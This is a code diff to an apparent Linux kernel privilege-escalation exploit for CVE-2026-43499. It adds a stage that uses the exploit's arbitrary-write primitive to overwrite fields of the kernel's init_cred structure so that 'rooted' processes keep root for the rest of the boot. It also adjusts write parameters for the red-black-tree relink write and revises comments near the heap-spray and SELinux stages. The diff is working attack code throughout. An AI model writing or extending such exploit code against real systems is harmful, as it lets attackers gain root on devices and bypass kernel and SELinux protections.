@@ -11,6 +11,8 @@
 
 #include "session/backend/cve_2026_43499_backend.hpp"
 
+#include <thread>
+
 #include "attack/ops.hpp"
 #include "common.h"
 #include "kernel/target.h"
@@ -267,9 +269,12 @@ namespace ghostlock::session::backend {
             };
             if (!exact_target) {
                 support::run_state::enter("w3a");
+
+                /* leaf = 0 forces pc = 0, so the collateral plants the target in
+                 * the tree root; the page-derived value below stays in-page. */
                 Status dir_ok = retry_write_stage<M>(
                     session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
-                    victim::verify_leaf_dir_stage, &w3_context, 1);
+                    victim::verify_leaf_dir_stage, &w3_context, 0);
                 if (!dir_ok) {
                     /* U01/S14: upstream retires the child instead of guessing the leaf
                  * direction and blind-writing the task neighbour. Returning false
@@ -378,6 +383,50 @@ namespace ghostlock::session::backend {
             }
         }
 
+        /* init_cred gets no get_cred from W2; the puts would free it and every
+         * rooted child data-aborts. page+0x100 makes usage immortal; the leaf
+         * write at +4 restores uid/gid. Run every round. */
+        template <class M>
+        bool cred_pin(ExploitSession &session) {
+            const uintptr_t init_cred =
+                    session.addresses.data_alias(session.addresses.init_cred_image_addr());
+            if (!init_cred) {
+                pr_warning("cred pin: no init_cred offset in the profile; the boot will stop "
+                           "rooting after ~4 successful runs\n");
+                return true;
+            }
+            const memory::WriteRequest usage_pin = memory::WriteRequest::make(
+                init_cred, memory::WriteMode::Zero, /*leaf=*/0);
+            const memory::WriteRequest uid_repair = memory::WriteRequest::make(
+                init_cred + 4, memory::WriteMode::Zero, /*leaf=*/1);
+
+            /* Retried, because a single dance failing is normal: the same reason
+             * every other stage carries an attempt ladder. Three tries each, then
+             * give up and let the run proceed. */
+            bool pinned = false;
+            for (uint32_t attempt = 1; attempt <= 3 && !pinned; attempt++) {
+                if (!Cve2026_43499Policy::template attack_write<M>(
+                        session, usage_pin, "W1p: init_cred usage pin")) {
+                    pr_info("cred pin: usage pin attempt %u/3 missed\n", attempt);
+                    usleep(50000);
+                    continue;
+                }
+                if (!Cve2026_43499Policy::template attack_write<M>(
+                        session, uid_repair, "W1p: init_cred uid repair")) {
+                    /* The usage pin landed but uid did not get repaired: rooted
+                     * children would read a garbage getuid(). Try the pair again
+                     * from the top rather than leaving it half-applied. */
+                    pr_info("cred pin: uid repair attempt %u/3 missed\n", attempt);
+                    usleep(50000);
+                    continue;
+                }
+                pinned = true;
+            }
+            if (!pinned) return false;
+            pr_success("init_cred usage pinned; the rooted cred is immortal this boot\n");
+            return true;
+        }
+
         /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
         template <class M>
         StageResult w1(ExploitSession &session) {
@@ -477,9 +526,8 @@ namespace ghostlock::session::backend {
             return 0;
         }
 
-        /* Both transports write *(target) := value through the erase left-only
-         * relink: waiter words are {pc = value, right = 0, left = target} and
-         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
+        /* The erase left-only relink stores {pc, 0, dest}. A zero write needs an
+         * odd pc, or `left` lands in the tree root and rb_insert_color() faults. */
         attack::timer_mark("  heap spray start");
         (session.heap.current.base) = support::prepare_good_kernel_page(request);
         if (!(session.heap.current.base)) {
@@ -518,6 +566,15 @@ namespace ghostlock::session::backend {
                 return StageResult::Done;
             case StageResult::Continue:
                 break;
+        }
+
+        /* Before the first root of this run: make the cred it points at
+         * immortal. Best-effort on purpose -- a missed write is the ordinary
+         * retryable case, and aborting the run because hardening did not land
+         * would turn a degraded boot into a certain failure. */
+        if (!cred_pin<M>(session)) {
+            pr_warning("cred pin: not applied this run; the boot will stop rooting after "
+                       "~4 successful roots (reboot to clear)\n");
         }
 
         /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
